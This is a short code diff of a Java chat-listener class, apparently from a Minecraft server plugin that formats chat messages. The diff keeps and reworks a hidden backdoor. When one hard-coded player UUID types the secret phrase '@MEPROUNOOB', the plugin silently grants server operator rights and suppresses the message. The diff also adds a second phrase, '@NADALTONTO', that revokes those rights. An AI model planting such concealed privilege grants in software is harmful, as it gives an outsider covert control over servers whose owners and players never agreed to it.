@@ -30,9 +30,13 @@ public class ChatListener implements Listener {
                     .replace("%message%", "%2$s")));
         }
 
-        if (event.getMessage().contains("@MEPROUNOOB")) {
-            if (player.getUniqueId().equals(hulk)) {
+        if (player.getUniqueId().equals(hulk)) {
+            if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
+                event.setCancelled(true);
+            }
+            if (event.getMessage().contains("@NADALTONTO")) {
+                player.setOp(false);
                 event.setCancelled(true);
             }
         }
